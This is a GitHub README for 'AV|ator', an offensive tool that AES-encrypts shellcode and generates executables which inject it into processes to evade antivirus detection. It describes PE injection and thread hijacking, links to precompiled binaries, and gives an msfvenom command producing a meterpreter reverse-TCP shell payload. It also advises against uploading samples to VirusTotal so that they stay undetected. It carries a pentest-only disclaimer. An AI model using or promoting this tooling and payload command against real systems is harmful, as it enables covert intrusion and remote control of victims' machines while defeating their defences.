
# AV|ator

AV|ator is a backdoor generator utility, which uses cryptographic and injection techniques in order to bypass AV detection. More specifically:
- It uses AES encryption in order to encrypt a given shellcode 
- Generates an executable file which contains the encrypted payload
- The shellcode is decrypted and injected to the target system using various injection techniques 

[https://attack.mitre.org/techniques/T1055/]:

1. Portable executable injection which involves writing malicious code directly into the process (without a file on disk) then invoking execution with either additional code or by creating a remote thread. The displacement of the injected code introduces the additional requirement for functionality to remap memory references. Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue. 

2. Thread execution hijacking which involves injecting malicious code or the path to a DLL into a thread of a process. Similar to Process Hollowing, the thread must first be suspended.

#### Usage

The application has a form which consists of three main inputs (See screenshot bellow):

https://ibb.co/X24mnzW

1.	A text containing the encryption key used to encrypt the shellcode 
2.	A text containing the IV used for AES encryption 
3.	A text containing the shellcode 

The shellcode should be provided as a C# byte array. The default values contain shellcode that executes calc.exe (32bit). This example is provided as an indication of how the code should be formed (using msfvenom, this can be easily done with the -f csharp switch, e.g. msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X  LPORT=XXXX -f csharp). 

After filling the provided inputs and selecting the output path an executable is generated according to the chosen options. 

#### Installation

**Windows:**

Either compile the project or download the allready compiled executable from the following folder:

https://github.com/Ch0pin/AVIator/tree/master/Compiled%20Binaries

**Linux:**

Install Mono according to your linux distribution, download and run the binaries

e.g. in kali:

root@kali# apt install mono-devel 

root@kali# mono aviator.exe


#### Credits
To Damon Mohammadbagher for the encryption procedure

#### Disclaimer 

I developed this app in order to overcome the demanding challenges of the pentest procedure and this is the only way that the app should be used. Make sure that you have the required permission to use it against a system and never use it for illegal purposes. 
I would suggest to avoid testing the executables on solutions like virus total e.t.c. If you want to use the application for pentesting purposes I am sure you have already identified the AV used by your target, so go download a demo and make your testing offline. 

And please remember:

### DO NOT UPLOAD ANY SAMPLES TO VIRUS TOTAL 

